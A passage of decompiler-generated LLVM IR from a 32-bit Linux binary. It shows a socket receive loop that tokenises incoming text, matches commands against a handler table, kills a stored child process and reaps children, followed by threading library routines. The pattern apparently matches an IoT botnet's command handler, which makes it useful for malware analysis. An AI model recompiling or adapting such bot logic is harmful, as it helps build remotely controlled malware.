  %v2_80560a1 = mul i32 %storemerge9103, 4
  %v0_80560a6 = load i32, i32* @global_var_807f0fc.32, align 4
  %v2_80560ab = add i32 %v0_80560a6, %v2_80560a1
  %v1_80560ae = inttoptr i32 %v2_80560ab to i32*
  %v2_80560ae = load i32, i32* %v1_80560ae, align 4
  store i32 %v2_80560ae, i32* %stack_var_-6672, align 4
  %v4_80560c3 = call i32 @waitpid(i32 %v2_80560ae, i32 0, i32 1)
  %tmp80 = icmp slt i32 %v4_80560c3, 1
  %.pre = add i32 %storemerge9103, 1
  br i1 %tmp80, label %dec_label_pc_8056191, label %dec_label_pc_80560d0

dec_label_pc_80560d0:                             ; preds = %dec_label_pc_805609e
  %v0_805610383 = load i32, i32* @global_var_807507c.31, align 4
  %v10_805610884 = icmp ult i32 %.pre, %v0_805610383
  %v2_80560dc85 = mul i32 %.pre, 4
  %v0_80560e186 = load i32, i32* @global_var_807f0fc.32, align 4
  %v2_80560e687 = add i32 %v0_80560e186, %v2_80560dc85
  %v1_80560e988 = add i32 %v2_80560e687, -4
  br i1 %v10_805610884, label %dec_label_pc_80560d9, label %dec_label_pc_805610d

dec_label_pc_80560d9:                             ; preds = %dec_label_pc_80560d0, %dec_label_pc_80560d9
  %v1_80560e992 = phi i32 [ %v1_80560e9, %dec_label_pc_80560d9 ], [ %v1_80560e988, %dec_label_pc_80560d0 ]
  %v2_80560e691 = phi i32 [ %v2_80560e6, %dec_label_pc_80560d9 ], [ %v2_80560e687, %dec_label_pc_80560d0 ]
  %storemerge1189 = phi i32 [ %v4_8056100, %dec_label_pc_80560d9 ], [ %.pre, %dec_label_pc_80560d0 ]
  store i32 %v1_80560e992, i32* @ecx, align 4
  %v1_80560fc = inttoptr i32 %v2_80560e691 to i32*
  %v2_80560fc = load i32, i32* %v1_80560fc, align 4
  %v2_80560fe = inttoptr i32 %v1_80560e992 to i32*
  store i32 %v2_80560fc, i32* %v2_80560fe, align 4
  %v4_8056100 = add i32 %storemerge1189, 1
  %v0_8056103 = load i32, i32* @global_var_807507c.31, align 4
  %v10_8056108 = icmp ult i32 %v4_8056100, %v0_8056103
  %v2_80560dc = mul i32 %v4_8056100, 4
  %v0_80560e1 = load i32, i32* @global_var_807f0fc.32, align 4
  %v2_80560e6 = add i32 %v0_80560e1, %v2_80560dc
  %v1_80560e9 = add i32 %v2_80560e6, -4
  br i1 %v10_8056108, label %dec_label_pc_80560d9, label %dec_label_pc_805610d

dec_label_pc_805610d:                             ; preds = %dec_label_pc_80560d9, %dec_label_pc_80560d0
  %v1_80560e9.lcssa = phi i32 [ %v1_80560e988, %dec_label_pc_80560d0 ], [ %v1_80560e9, %dec_label_pc_80560d9 ]
  %v1_8056120 = inttoptr i32 %v1_80560e9.lcssa to i32*
  store i32 0, i32* %v1_8056120, align 4
  %v0_8056126 = load i32, i32* @global_var_807507c.31, align 4
  %v1_805612b = add i32 %v0_8056126, -1
  store i32 %v1_805612b, i32* @global_var_807507c.31, align 4
  %v2_8056136 = mul i32 %v1_805612b, 4
  %v1_8056139 = add i32 %v2_8056136, 4
  store i32 %v1_8056139, i32* %stack_var_-6672, align 4
  %v1_805613f = call i32 @malloc(i32 %v1_8056139)
  %v0_805617293 = load i32, i32* @global_var_807507c.31, align 4
  %v10_805617795 = icmp eq i32 %v0_805617293, 0
  br i1 %v10_805617795, label %dec_label_pc_805617c, label %dec_label_pc_8056150

dec_label_pc_8056150:                             ; preds = %dec_label_pc_805610d, %dec_label_pc_8056150
  %storemerge1096 = phi i32 [ %v4_805616f, %dec_label_pc_8056150 ], [ 0, %dec_label_pc_805610d ]
  %v2_8056153 = mul i32 %storemerge1096, 4
  %v5_8056158 = add i32 %v2_8056153, %v1_805613f
  store i32 %v5_8056158, i32* @ecx, align 4
  %v0_8056163 = load i32, i32* @global_var_807f0fc.32, align 4
  %v2_8056168 = add i32 %v0_8056163, %v2_8056153
  %v1_805616b = inttoptr i32 %v2_8056168 to i32*
  %v2_805616b = load i32, i32* %v1_805616b, align 4
  %v2_805616d = inttoptr i32 %v5_8056158 to i32*
  store i32 %v2_805616b, i32* %v2_805616d, align 4
  %v4_805616f = add i32 %storemerge1096, 1
  %v0_8056172 = load i32, i32* @global_var_807507c.31, align 4
  %v10_8056177 = icmp ult i32 %v4_805616f, %v0_8056172
  br i1 %v10_8056177, label %dec_label_pc_8056150, label %dec_label_pc_8056172.dec_label_pc_805617c_crit_edge

dec_label_pc_8056172.dec_label_pc_805617c_crit_edge: ; preds = %dec_label_pc_8056150
  br label %dec_label_pc_805617c

dec_label_pc_805617c:                             ; preds = %dec_label_pc_805610d, %dec_label_pc_8056172.dec_label_pc_805617c_crit_edge
  %v0_805617c = load i32, i32* @global_var_807f0fc.32, align 4
  store i32 %v0_805617c, i32* %stack_var_-6672, align 4
  %v1_8056184 = call i32 @free(i32 %v0_805617c)
  store i32 %v1_805613f, i32* @global_var_807f0fc.32, align 4
  br label %dec_label_pc_8056191

dec_label_pc_8056191:                             ; preds = %dec_label_pc_805609e, %dec_label_pc_805617c
  %v0_8056194 = load i32, i32* @global_var_807507c.31, align 4
  %v10_8056199 = icmp ult i32 %.pre, %v0_8056194
  br i1 %v10_8056199, label %dec_label_pc_805609e, label %dec_label_pc_80561a2

dec_label_pc_80561a2:                             ; preds = %dec_label_pc_8056191, %dec_label_pc_8056194.preheader
  %v0_80561a2 = load i32, i32* @global_var_807db70.29, align 16
  %v1_80561a9 = urem i32 %v0_80561a2, 32
  %v2_80561b1 = udiv i32 %v0_80561a2, 32
  %v0_80561b4 = load i32, i32* @ebp, align 4
  %v2_80561b4 = mul nuw nsw i32 %v2_80561b1, 4
  %v3_80561b4 = add nsw i32 %v2_80561b4, -452
  %v4_80561b4 = add i32 %v3_80561b4, %v0_80561b4
  %v5_80561b4 = inttoptr i32 %v4_80561b4 to i32*
  %v6_80561b4 = load i32, i32* %v5_80561b4, align 4
  %v9_80561b4 = shl i32 1, %v1_80561a9
  %v10_80561b4 = and i32 %v6_80561b4, %v9_80561b4
  %v11_80561b4 = icmp ne i32 %v10_80561b4, 0
  %v4_80561bf = icmp eq i1 %v11_80561b4, false
  br i1 %v4_80561bf, label %dec_label_pc_805600f, label %dec_label_pc_80561c7

dec_label_pc_80561c7:                             ; preds = %dec_label_pc_80561a2
  store i32 %v0_80561a2, i32* %stack_var_-6672, align 4
  %v5_80561e9 = call i32 @recv(i32 %v0_80561a2, i32 %v2_80561dc, i32 4096, i32 0)
  %tmp81 = icmp slt i32 %v5_80561e9, 1
  br i1 %tmp81, label %dec_label_pc_8055fc3, label %dec_label_pc_80561fb

dec_label_pc_80561fb:                             ; preds = %dec_label_pc_80561c7
  %v0_80561fe = load i32, i32* @ebp, align 4
  %v2_80561fe = add i32 %v5_80561e9, -6596
  %v3_80561fe = add i32 %v2_80561fe, %v0_80561fe
  %v4_80561fe = inttoptr i32 %v3_80561fe to i8*
  store i8 0, i8* %v4_80561fe, align 1
  store i32 %v2_80561dc, i32* @eax, align 4
  store i32 %v2_80561dc, i32* %stack_var_-6672, align 4
  %v3_8056217 = call i32 @__GI_strtok(i32 %v2_80561dc, i32 ptrtoint (i32* @global_var_806d67c.608 to i32))
  %v5_805621c = inttoptr i32 %v3_8056217 to i8*
  store i8* %v5_805621c, i8** %stack_var_-32, align 4
  %v5_80563f515 = icmp eq i32 %v3_8056217, 0
  br i1 %v5_80563f515, label %dec_label_pc_805600f, label %dec_label_pc_80563ff

dec_label_pc_8056224:                             ; preds = %dec_label_pc_80563ff
  %v3_805622a = call i32 @filter(i8* %v4_80562fa36)
  %v2_8056232 = load i8, i8* %v4_80562fa36, align 1
  %v10_8056235 = icmp eq i8 %v2_8056232, 58
  %v1_8056237 = icmp eq i1 %v10_8056235, false
  br i1 %v1_8056237, label %dec_label_pc_80562ae, label %dec_label_pc_8056245.preheader

dec_label_pc_8056245.preheader:                   ; preds = %dec_label_pc_8056224
  br label %dec_label_pc_8056245

dec_label_pc_8056242:                             ; preds = %dec_label_pc_805626a
  %v4_8056242 = add i32 %storemerge8, 1
  br label %dec_label_pc_8056245

dec_label_pc_8056245:                             ; preds = %dec_label_pc_8056245.preheader, %dec_label_pc_8056242
  %storemerge8 = phi i32 [ %v4_8056242, %dec_label_pc_8056242 ], [ 0, %dec_label_pc_8056245.preheader ]
  store i1 false, i1* @df, align 1
  %v3_805625f = call i32 @_strlen(i8* %v4_80562fa36)
  %v7_8056266 = icmp ult i32 %storemerge8, %v3_805625f
  %v1_8056268 = icmp eq i1 %v7_8056266, false
  %.pre120 = add i32 %storemerge8, %v4_80563ff
  br i1 %v1_8056268, label %dec_label_pc_8056245.dec_label_pc_8056277_crit_edge, label %dec_label_pc_805626a

dec_label_pc_8056245.dec_label_pc_8056277_crit_edge: ; preds = %dec_label_pc_8056245
  %.pre121 = inttoptr i32 %.pre120 to i8*
  br label %dec_label_pc_8056277

dec_label_pc_805626a:                             ; preds = %dec_label_pc_8056245
  %v1_8056270 = inttoptr i32 %.pre120 to i8*
  %v2_8056270 = load i8, i8* %v1_8056270, align 1
  %v7_8056273 = icmp eq i8 %v2_8056270, 32
  %v1_8056275 = icmp eq i1 %v7_8056273, false
  br i1 %v1_8056275, label %dec_label_pc_8056242, label %dec_label_pc_8056277

dec_label_pc_8056277:                             ; preds = %dec_label_pc_8056245.dec_label_pc_8056277_crit_edge, %dec_label_pc_805626a
  %v1_805627d.pre-phi = phi i8* [ %.pre121, %dec_label_pc_8056245.dec_label_pc_8056277_crit_edge ], [ %v1_8056270, %dec_label_pc_805626a ]
  store i8 0, i8* %v1_805627d.pre-phi, align 1
  %v3_8056280 = load i8*, i8** %stack_var_-32, align 4
  %v4_8056280 = ptrtoint i8* %v3_8056280 to i32
  %v1_8056283 = add i32 %v4_8056280, 1
  store i32 %v1_8056283, i32* %stack_var_-6672, align 4
  store i32 %v2_80562ae, i32* @eax, align 4
  %v4_8056291 = call i32 @strcpy(i8* %tmp78, i32 %v1_8056283)
  %v6_8056299 = add i32 %storemerge8, 1
  %v1_805629c = add i32 %v6_8056299, %v4_8056280
  store i32 %v1_805629c, i32* %stack_var_-6672, align 4
  store i32 %v4_8056280, i32* @eax, align 4
  %v4_80562a7 = call i32 @strcpy(i8* %v3_8056280, i32 %v1_805629c)
  br label %dec_label_pc_80562c5.preheader

dec_label_pc_80562ae:                             ; preds = %dec_label_pc_8056224
  store i32 42, i32* %stack_var_-2508, align 4
  br label %dec_label_pc_80562c5.preheader

dec_label_pc_80562c5.preheader:                   ; preds = %dec_label_pc_8056277, %dec_label_pc_80562ae
  %v4_80562fa = phi i8* [ %v3_8056280, %dec_label_pc_8056277 ], [ %v4_80562fa36, %dec_label_pc_80562ae ]
  %v4_80562c8 = ptrtoint i8* %v4_80562fa to i32
  br label %dec_label_pc_80562c5

dec_label_pc_80562c2:                             ; preds = %dec_label_pc_80562ea
  %v4_80562c2 = add i32 %storemerge7, 1
  br label %dec_label_pc_80562c5

dec_label_pc_80562c5:                             ; preds = %dec_label_pc_80562c5.preheader, %dec_label_pc_80562c2
  %storemerge7 = phi i32 [ %v4_80562c2, %dec_label_pc_80562c2 ], [ 0, %dec_label_pc_80562c5.preheader ]
  store i1 false, i1* @df, align 1
  store i32 %v4_80562c8, i32* @edi, align 4
  %v3_80562df = call i32 @_strlen(i8* %v4_80562fa)
  %v7_80562e6 = icmp ult i32 %storemerge7, %v3_80562df
  %v1_80562e8 = icmp eq i1 %v7_80562e6, false
  %.pre118 = add i32 %storemerge7, %v4_80562c8
  br i1 %v1_80562e8, label %dec_label_pc_80562c5.dec_label_pc_80562f7_crit_edge, label %dec_label_pc_80562ea

dec_label_pc_80562c5.dec_label_pc_80562f7_crit_edge: ; preds = %dec_label_pc_80562c5
  %.pre119 = inttoptr i32 %.pre118 to i8*
  br label %dec_label_pc_80562f7

dec_label_pc_80562ea:                             ; preds = %dec_label_pc_80562c5
  %v1_80562f0 = inttoptr i32 %.pre118 to i8*
  %v2_80562f0 = load i8, i8* %v1_80562f0, align 1
  %v7_80562f3 = icmp eq i8 %v2_80562f0, 32
  %v1_80562f5 = icmp eq i1 %v7_80562f3, false
  br i1 %v1_80562f5, label %dec_label_pc_80562c2, label %dec_label_pc_80562f7

dec_label_pc_80562f7:                             ; preds = %dec_label_pc_80562c5.dec_label_pc_80562f7_crit_edge, %dec_label_pc_80562ea
  %v1_80562fd.pre-phi = phi i8* [ %.pre119, %dec_label_pc_80562c5.dec_label_pc_80562f7_crit_edge ], [ %v1_80562f0, %dec_label_pc_80562ea ]
  store i8 0, i8* %v1_80562fd.pre-phi, align 1
  %v3_8056300 = load i8*, i8** %stack_var_-32, align 4
  store i32 %v2_8056307, i32* @eax, align 4
  store i32 %v2_8056307, i32* %stack_var_-6672, align 4
  %v2_8056310 = ptrtoint i8* %v3_8056300 to i32
  %v4_8056310 = call i32 @strcpy(i8* %v3_8056310, i32 %v2_8056310)
  %v6_8056318 = add i32 %storemerge7, 1
  %v1_805631b = add i32 %v6_8056318, %v2_8056310
  store i32 %v2_8056310, i32* @eax, align 4
  store i32 %v2_8056310, i32* %stack_var_-6672, align 4
  %v4_8056326 = call i32 @strcpy(i8* %v3_8056300, i32 %v1_805631b)
  %v4_8056380104 = load i32, i32* bitcast ([4 x i8]** @global_var_8070860.610 to i32*), align 8
  %v1_8056387105 = icmp eq i32 %v4_8056380104, 0
  %v1_8056389107 = icmp eq i1 %v1_8056387105, false
  br i1 %v1_8056389107, label %dec_label_pc_8056334, label %dec_label_pc_805638b

dec_label_pc_8056334:                             ; preds = %dec_label_pc_80562f7, %dec_label_pc_8056334
  %v3_8056380110 = phi i32* [ %v3_8056380, %dec_label_pc_8056334 ], [ bitcast ([4 x i8]** @global_var_8070860.610 to i32*), %dec_label_pc_80562f7 ]
  %v1_8056380109 = phi i32 [ %v1_8056380, %dec_label_pc_8056334 ], [ 0, %dec_label_pc_80562f7 ]
  %storemerge108 = phi i32 [ %v4_805637a, %dec_label_pc_8056334 ], [ 0, %dec_label_pc_80562f7 ]
  %v4_8056337 = load i32, i32* %v3_8056380110, align 8
  store i32 %v4_8056337, i32* %stack_var_-6672, align 4
  %v3_805634b = inttoptr i32 %v4_8056337 to i8*
  %v4_805634b = call i32 @__GI_strcasecmp(i8* %v3_805634b, i32 %v2_8056307)
  %v2_8056357 = add i32 %v1_8056380109, ptrtoint (i32* @global_var_8070864.611 to i32)
  %v3_8056357 = inttoptr i32 %v2_8056357 to i32*
  %v4_8056357 = load i32, i32* %v3_8056357, align 4
  %v0_805635e = load i32, i32* @global_var_807db70.29, align 16
  store i32 %v0_805635e, i32* %stack_var_-6672, align 4
  call void @__pseudo_call(i32 %v4_8056357)
  %v4_805637a = add i32 %storemerge108, 1
  %v1_8056380 = mul i32 %v4_805637a, 8
  %v2_8056380 = add i32 %v1_8056380, ptrtoint ([4 x i8]** @global_var_8070860.610 to i32)
  %v3_8056380 = inttoptr i32 %v2_8056380 to i32*
  %v4_8056380 = load i32, i32* %v3_8056380, align 8
  %v1_8056387 = icmp eq i32 %v4_8056380, 0
  %v1_8056389 = icmp eq i1 %v1_8056387, false
  br i1 %v1_8056389, label %dec_label_pc_8056334, label %dec_label_pc_805638b

dec_label_pc_805638b:                             ; preds = %dec_label_pc_8056334, %dec_label_pc_80562f7
  store i32 %v2_8056307, i32* %stack_var_-6672, align 4
  %v4_805639c = call i32 @__GI_strcasecmp(i8* %v3_8056310, i32 ptrtoint ([6 x i8]* @global_var_806d67e.612 to i32))
  store i32 %v4_805639c, i32* @eax, align 4
  %v1_80563a1 = icmp eq i32 %v4_805639c, 0
  %v1_80563a3 = icmp eq i1 %v1_80563a1, false
  br i1 %v1_80563a3, label %dec_label_pc_80563de, label %dec_label_pc_80563a5

dec_label_pc_80563a5:                             ; preds = %dec_label_pc_805638b
  %v0_80563a5 = load i32, i32* @global_var_8075068.259, align 8
  %v1_80563aa = icmp eq i32 %v0_80563a5, 0
  br i1 %v1_80563aa, label %dec_label_pc_8055fc3, label %dec_label_pc_80563b2

dec_label_pc_80563b2:                             ; preds = %dec_label_pc_80563a5
  store i32 %v0_80563a5, i32* %stack_var_-6672, align 4
  %v3_80563c2 = call i32 @kill(i32 %v0_80563a5, i32 9)
  %v1_80563c7 = icmp eq i32 %v3_80563c2, 0
  %v1_80563c9 = icmp eq i1 %v1_80563c7, false
  br i1 %v1_80563c9, label %dec_label_pc_8055fc3, label %dec_label_pc_80563cf

dec_label_pc_80563cf:                             ; preds = %dec_label_pc_80563b2
  store i32 0, i32* @global_var_8075068.259, align 8
  br label %dec_label_pc_8055fc3

dec_label_pc_80563de:                             ; preds = %dec_label_pc_805638b
  store i32 0, i32* %stack_var_-6672, align 4
  %v3_80563ed = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_806d67c.608 to i32))
  store i32 %v3_80563ed, i32* %tmp77, align 4
  %v5_80563f5 = icmp eq i32 %v3_80563ed, 0
  %tmp82 = inttoptr i32 %v3_80563ed to i8*
  br i1 %v5_80563f5, label %dec_label_pc_805600f, label %dec_label_pc_80563ff

dec_label_pc_80563ff:                             ; preds = %dec_label_pc_80561fb, %dec_label_pc_80563de
  %v4_80562fa36 = phi i8* [ %tmp82, %dec_label_pc_80563de ], [ %v5_805621c, %dec_label_pc_80561fb ]
  %v4_80563ff = ptrtoint i8* %v4_80562fa36 to i32
  %v2_8056402 = load i8, i8* %v4_80562fa36, align 1
  %v4_8056405 = icmp eq i8 %v2_8056402, 0
  %v1_8056407 = icmp eq i1 %v4_8056405, false
  br i1 %v1_8056407, label %dec_label_pc_8056224, label %dec_label_pc_805600f

; uselistorder directives
  uselistorder i8* %v4_80562fa36, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_80563a5, { 1, 0, 2 }
  uselistorder i32* %v3_8056380, { 1, 0 }
  uselistorder i32 %v1_8056380, { 1, 0 }
  uselistorder i32 %v4_805637a, { 1, 0 }
  uselistorder i32 %v2_8056310, { 2, 1, 0, 3 }
  uselistorder i32 %storemerge7, { 2, 1, 0, 3 }
  uselistorder i32 %v4_8056280, { 1, 0, 2 }
  uselistorder i32 %storemerge8, { 2, 1, 0, 3 }
  uselistorder i32 %v5_80561e9, { 1, 0 }
  uselistorder i32 %v0_80561a2, { 2, 3, 0, 1 }
  uselistorder i32 %v4_805616f, { 1, 0 }
  uselistorder i32 %v2_8056153, { 1, 0 }
  uselistorder i32 %storemerge1096, { 1, 0 }
  uselistorder i32 %v1_805613f, { 1, 0 }
  uselistorder i32 %v2_80560e6, { 1, 0 }
  uselistorder i32 %v4_8056100, { 0, 2, 1 }
  uselistorder i32 %v1_80560e992, { 1, 0 }
  uselistorder i32 %.pre, { 3, 1, 0, 4, 2 }
  uselistorder i32 %storemerge9103, { 1, 0 }
  uselistorder i32 %v1_805605b, { 1, 0 }
  uselistorder i32 %v0_8056028, { 1, 0 }
  uselistorder i32 %v2_80561dc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_8055f0b, { 1, 0 }
  uselistorder i32 %v2_8055ebb, { 1, 0 }
  uselistorder i32 %storemerge12116, { 1, 0 }
  uselistorder i32 %v2_8055ddb, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-6672, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 1, 26, 27, 28, 29, 2, 30, 31, 32 }
  uselistorder i32* %stack_var_-2508, { 1, 0, 2 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 0 }
  uselistorder [4 x i8]** @global_var_8070860.610, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 2, 1, 0 }
  uselistorder i32* @global_var_807f0fc.32, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_807507c.31, { 3, 4, 1, 5, 6, 7, 2, 0 }
  uselistorder i32 (i32, i32)* @realrand, { 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 0, 1 }
  uselistorder i32 (i32*)* @__GI_time, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 (i32)* @puts, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80563ff, { 1, 0 }
  uselistorder label %dec_label_pc_8056334, { 1, 0 }
  uselistorder label %dec_label_pc_80562f7, { 1, 0 }
  uselistorder label %dec_label_pc_80562c5, { 1, 0 }
  uselistorder label %dec_label_pc_80562c5.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8056277, { 1, 0 }
  uselistorder label %dec_label_pc_8056245, { 1, 0 }
  uselistorder label %dec_label_pc_8056191, { 1, 0 }
  uselistorder label %dec_label_pc_805617c, { 1, 0 }
  uselistorder label %dec_label_pc_8056150, { 1, 0 }
  uselistorder label %dec_label_pc_80560d9, { 1, 0 }
  uselistorder label %dec_label_pc_805609e, { 1, 0 }
  uselistorder label %dec_label_pc_805600f, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_8055fc3, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_8055eb8, { 1, 0 }
  uselistorder label %dec_label_pc_8055e68, { 1, 0 }
}

define i32 @thread_self() local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_8056414 = load i32, i32* @esp, align 4
  %v1_8056414 = load i32, i32* @global_var_807b620.613, align 32
  %v7_8056414 = icmp ult i32 %v0_8056414, %v1_8056414
  %v1_805641a = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_805641a, i32* @edx, align 4
  %v1_8056421 = icmp eq i1 %v7_8056414, false
  br i1 %v1_8056421, label %dec_label_pc_8056452, label %dec_label_pc_8056423

dec_label_pc_8056423:                             ; preds = %entry
  %v1_8056423 = load i32, i32* @global_var_807b624.614, align 4
  %v7_8056423 = icmp ult i32 %v0_8056414, %v1_8056423
  br i1 %v7_8056423, label %dec_label_pc_8056438, label %dec_label_pc_805642b

dec_label_pc_805642b:                             ; preds = %dec_label_pc_8056423
  %v1_805642b = load i32, i32* @global_var_807b628.615, align 8
  %v7_805642b = icmp ult i32 %v0_8056414, %v1_805642b
  br i1 %v7_805642b, label %dec_label_pc_8056452, label %dec_label_pc_8056438

dec_label_pc_8056438:                             ; preds = %dec_label_pc_805642b, %dec_label_pc_8056423
  %v0_8056438 = load i32, i32* @global_var_807f100.617, align 256
  %v1_8056438 = icmp eq i32 %v0_8056438, 0
  br i1 %v1_8056438, label %dec_label_pc_8056446, label %dec_label_pc_8056441

dec_label_pc_8056441:                             ; preds = %dec_label_pc_8056438
  %v0_8056441 = call i32 @__pthread_find_self()
  br label %dec_label_pc_8056446

dec_label_pc_8056446:                             ; preds = %dec_label_pc_8056438, %dec_label_pc_8056441
  %v3_8056446 = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_8056446, i32* @edx, align 4
  %v2_805644c = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_8056452

dec_label_pc_8056452:                             ; preds = %dec_label_pc_805642b, %entry, %dec_label_pc_8056446
  %v0_8056452 = phi i32 [ ptrtoint (i32* @global_var_8074aa0.616 to i32), %dec_label_pc_805642b ], [ 134695104, %entry ], [ %v2_805644c, %dec_label_pc_8056446 ]
  ret i32 %v0_8056452

; uselistorder directives
  uselistorder label %dec_label_pc_8056452, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056446, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8056465 = call i32 @thread_self()
  %v1_805646a = add i32 %v0_8056465, 68
  %v2_805646a = inttoptr i32 %v1_805646a to i32*
  %v3_805646a = load i32, i32* %v2_805646a, align 4
  ret i32 %v3_805646a
}

define i32 @thread_self.1(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_80564af = load i32, i32* @esp, align 4
  %v1_80564af = load i32, i32* @global_var_807b620.613, align 32
  %v7_80564af = icmp ult i32 %v0_80564af, %v1_80564af
  %v1_80564bc = icmp eq i1 %v7_80564af, false
  br i1 %v1_80564bc, label %dec_label_pc_80564ed, label %dec_label_pc_80564be

dec_label_pc_80564be:                             ; preds = %entry
  %v1_80564be = load i32, i32* @global_var_807b624.614, align 4
  %v7_80564be = icmp ult i32 %v0_80564af, %v1_80564be
  br i1 %v7_80564be, label %dec_label_pc_80564d3, label %dec_label_pc_80564c6

dec_label_pc_80564c6:                             ; preds = %dec_label_pc_80564be
  %v1_80564c6 = load i32, i32* @global_var_807b628.615, align 8
  %v7_80564c6 = icmp ult i32 %v0_80564af, %v1_80564c6
  br i1 %v7_80564c6, label %dec_label_pc_80564ed, label %dec_label_pc_80564d3

dec_label_pc_80564d3:                             ; preds = %dec_label_pc_80564c6, %dec_label_pc_80564be
  %v0_80564d3 = load i32, i32* @global_var_807f100.617, align 256
  %v1_80564d3 = icmp eq i32 %v0_80564d3, 0
  br i1 %v1_80564d3, label %dec_label_pc_80564e1, label %dec_label_pc_80564dc

dec_label_pc_80564dc:                             ; preds = %dec_label_pc_80564d3
  %v0_80564dc = call i32 @__pthread_find_self()
  br label %dec_label_pc_80564e1

dec_label_pc_80564e1:                             ; preds = %dec_label_pc_80564d3, %dec_label_pc_80564dc
  %v2_80564e7 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_80564ed

dec_label_pc_80564ed:                             ; preds = %dec_label_pc_80564c6, %entry, %dec_label_pc_80564e1
  %v0_80564ed = phi i32 [ ptrtoint (i32* @global_var_8074aa0.616 to i32), %dec_label_pc_80564c6 ], [ ptrtoint (i32* @global_var_80748c0 to i32), %entry ], [ %v2_80564e7, %dec_label_pc_80564e1 ]
  ret i32 %v0_80564ed

; uselistorder directives
  uselistorder label %dec_label_pc_80564ed, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80564e1, { 1, 0 }
}

define i32 @suspend() local_unnamed_addr {
entry:
  %v0_8056533 = load i32, i32* @eax, align 4
  %v1_8056534 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_8056533)
  ret i32 %v1_8056534
}

define i32 @__pthread_do_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_805653d = load i32, i32* @esi, align 4
  %v0_805653e = load i32, i32* @ebx, align 4
  %v2_8056545 = call i32 @thread_self.1(i32 %v0_805653e, i32 %v0_805653d)
  %v1_805654d = add i32 %v2_8056545, 64
  %v2_805654d = inttoptr i32 %v1_805654d to i8*
  store i8 1, i8* %v2_805654d, align 1
  store i32 %v2_8056545, i32* @ebx, align 4
  %v1_8056553 = add i32 %v2_8056545, 65
  %v2_8056553 = inttoptr i32 %v1_8056553 to i8*
  store i8 0, i8* %v2_8056553, align 1
  store i32 %arg2, i32* %stack_var_-188, align 4
  %v1_805655e = call i32 @__pthread_perform_cleanup(i32 %arg2)
  %v0_8056563 = call i32 @__pthread_destroy_specifics()
  %v0_8056568 = load i32, i32* @ebx, align 4
  %v1_8056568 = add i32 %v0_8056568, 28
  %v2_8056568 = inttoptr i32 %v1_8056568 to i32*
  %v3_8056568 = load i32, i32* %v2_8056568, align 4
  store i32 %v3_8056568, i32* @eax, align 4
  store i32 %v0_8056568, i32* @edx, align 4
  %v0_805656d = load i32, i32* %stack_var_-188, align 4
  %v1_805656d = call i32 @__pthread_lock(i32 %v0_805656d)
  %v0_805657c = load i32, i32* @ebx, align 4
  %v1_805657c = add i32 %v0_805657c, 412
  %v2_805657c = inttoptr i32 %v1_805657c to i32*
  %v3_805657c = load i32, i32* %v2_805657c, align 4
  %v4_805657c = icmp eq i32 %v3_805657c, 0
  %v2_8056583 = add i32 %v0_805657c, 48
  %v3_8056583 = inttoptr i32 %v2_8056583 to i32*
  store i32 %arg1, i32* %v3_8056583, align 4
  br i1 %v4_805657c, label %dec_label_pc_80565b3, label %dec_label_pc_8056588

dec_label_pc_8056588:                             ; preds = %entry
  %v0_8056588 = load i32, i32* @global_var_807f104.618, align 4
  %v1_805658d = load i32, i32* @ebx, align 4
  %v2_805658d = add i32 %v1_805658d, 416
  %v3_805658d = inttoptr i32 %v2_805658d to i32*
  %v4_805658d = load i32, i32* %v3_805658d, align 4
  %v5_805658d = or i32 %v4_805658d, %v0_8056588
  store i32 %v5_805658d, i32* @eax, align 4
  %v3_8056593 = and i32 %v5_805658d, 256
  %v4_8056593 = icmp eq i32 %v3_8056593, 0
  br i1 %v4_8056593, label %dec_label_pc_80565b3, label %dec_label_pc_8056598

dec_label_pc_8056598:                             ; preds = %dec_label_pc_8056588
  %v1_8056598 = add i32 %v1_805658d, 424
  %v2_8056598 = inttoptr i32 %v1_8056598 to i32*
  store i32 9, i32* %v2_8056598, align 4
  %v0_80565a2 = load i32, i32* @ebx, align 4
  %v2_80565a2 = add i32 %v0_80565a2, 428
  %v3_80565a2 = inttoptr i32 %v2_80565a2 to i32*
  store i32 %v0_80565a2, i32* %v3_80565a2, align 4
  %v0_80565a8 = load i32, i32* @ebx, align 4
  store i32 %v0_80565a8, i32* @global_var_807f10c.619, align 4
  %v0_80565ae = call i32 @__linuxthreads_death_event()
  br label %dec_label_pc_80565b3

dec_label_pc_80565b3:                             ; preds = %dec_label_pc_8056588, %entry, %dec_label_pc_8056598
  %v0_80565b6 = load i32, i32* @ebx, align 4
  %v1_80565b6 = add i32 %v0_80565b6, 56
  %v2_80565b6 = inttoptr i32 %v1_80565b6 to i32*
  %v3_80565b6 = load i32, i32* %v2_80565b6, align 4
  %v1_80565b9 = add i32 %v0_80565b6, 44
